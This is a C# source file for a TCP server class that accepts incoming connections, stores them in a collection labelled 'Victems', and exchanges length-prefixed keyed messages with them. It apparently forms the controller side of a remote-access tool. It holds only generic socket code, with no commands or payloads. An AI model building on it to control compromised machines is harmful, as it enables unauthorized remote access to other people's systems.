using System;
//using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

using System.Threading;
using System.Net;
using System.Net.Sockets;

using System.Collections.Concurrent;


namespace MirrorShield
{
    class Server
    {
        IPEndPoint localEndPoint;
        Socket listener;
        Thread RxThread;
        ConcurrentDictionary<string, Socket> Victems;
        //================================================================
        public Server(string ip, int port)
        {
            Victems = new ConcurrentDictionary<string, Socket>();
            localEndPoint = new IPEndPoint
                    (IPAddress.Parse(ip), port);
            listener = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
            listener.Bind(localEndPoint);
            listener.Listen(10);

            RxThread = new Thread(RunRX);
            RxThread.Start();
        }
        //================================================================

        private void RunRX()
        {
            while (true)
            {
                Socket s = listener.Accept();
                Console.WriteLine(s.RemoteEndPoint.ToString());
                Victems.TryAdd(s.RemoteEndPoint.ToString(), s);
            }
        }
        //================================================================
        public string GetFirstVictem()
        {
            string firstKey = null;
            foreach (string k in Victems.Keys)
            {
                firstKey = k;
                break;
            }
            return firstKey;
        }

        //================================================================
        private void Tx(Socket s, string key1, string key2, string[] arr) // sender
        {
            string msg = MessageToLineProt(key1, key2, arr);

            byte[] bmsg = Encoding.ASCII.GetBytes(msg);
            string strTotalByteCount = string.Format("{0:D10}", bmsg.Length);
            byte[] bmsgTotalCount = Encoding.ASCII.GetBytes(strTotalByteCount);

            s.Send(bmsgTotalCount);
            s.Send(bmsg);
        }
        //================================================================
        private string MessageToLineProt(string key1, string key2, string[] arr)
        {
            StringBuilder sb = new StringBuilder();
            string stmp = string.Format("{0:D2}", key1.Length);
            sb.Append(stmp);
            sb.Append(key1);

            stmp = string.Format("{0:D2}", key2.Length);
            sb.Append(stmp);
            sb.Append(key2);
            bool first = true;

            if (arr != null)
            {
                foreach (string s in arr)
                {
                    if (first)
                    {
                        sb.Append(s);
                        first = false;
                    }
                    else
                    {
                        sb.Append("\b");
                        sb.Append(s);
                    }
                }
            }

            stmp = string.Format("{0:D10}", sb.Length);
            sb.Insert(0, stmp);

            return sb.ToString();

        }

        //================================================================
        private void Rx(Socket sock, out string key1, out string key2, out string[] arr) // reciever
        {
            byte[] bytes = new byte[1024];
            int byteContRx, tempCountRx, totalByteLen;

            // get 10 bytes of message len in bytes, those 10 bytes
            // are not counted in the total length
            byteContRx = sock.Receive(bytes, 10, SocketFlags.None);
            string msg = Encoding.ASCII.GetString(bytes, 0, byteContRx);
            totalByteLen = int.Parse(msg);

            // Read exactly all messageg bytes
            StringBuilder sb = new StringBuilder();
            tempCountRx = 0;
            while (tempCountRx < totalByteLen)
            {
                int bytesToRead;
                if (totalByteLen - tempCountRx >= 1024)
                    bytesToRead = 1024;
                else
                    bytesToRead = totalByteLen - tempCountRx;

                byteContRx = sock.Receive(bytes, bytesToRead, SocketFlags.None);
                tempCountRx += byteContRx;

                msg = Encoding.ASCII.GetString(bytes, 0, byteContRx);
                sb.Append(msg);
            }// end while (tempCountRx < totalByteLen)

            ProcessAnswer(sb, out key1, out key2, out arr);
        }
        //==========================================================
        private void ProcessAnswer(StringBuilder sb, out string key1, out string key2, out string[] arr)
        {
            LineProtToMessage(sb.ToString(), out key1, out key2, out arr);
        }
        //==========================================================
        private void LineProtToMessage(string msg, out string key1,
                                        out string key2, out string[] arr)
        {
            int totalMsgLenght = msg.Length;

            int strPos = 0;
            string strTotalLemgth = msg.Substring(strPos, 10);
            int totalLenght = int.Parse(strTotalLemgth);

            strPos += 10;
            string strKey1Length = msg.Substring(strPos, 2);
            int key1Length = int.Parse(strKey1Length);

            strPos += 2;
            key1 = msg.Substring(strPos, key1Length);

            strPos += key1Length;
            string strKey2Length = msg.Substring(strPos, 2);
            int key2Length = int.Parse(strKey2Length);

            strPos += 2;
            key2 = msg.Substring(strPos, key2Length);

            strPos += key2Length;

            if (strPos >= totalLenght + 10)
                arr = null;
            else
            {
                string strArr = msg.Substring(strPos);
                arr = strArr.Split('\b');
            }
        }
    }
}
